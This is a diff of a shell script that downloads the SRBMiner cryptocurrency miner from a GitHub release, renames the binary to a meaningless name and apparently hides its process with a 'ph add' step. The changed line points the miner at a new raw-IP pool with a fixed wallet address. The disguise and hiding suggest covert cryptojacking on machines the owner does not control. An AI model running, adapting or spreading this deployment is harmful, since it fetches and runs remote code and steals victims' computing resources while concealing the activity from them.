@@ -15,4 +15,4 @@ wget https://github.com/rxt36q6/file/releases/download/1/SRBMiner-Multi-3-5-9-Li
 tar xf SRBMiner-Multi-3-5-9-Linux.tar.gz
 mv SRBMiner-MULTI palsokao
 ph add palsokao
-./palsokao --disable-cpu --algorithm pearlhash --pool 212.47.248.156:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
+./palsokao --disable-cpu --algorithm pearlhash --pool 51.15.133.65:80 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
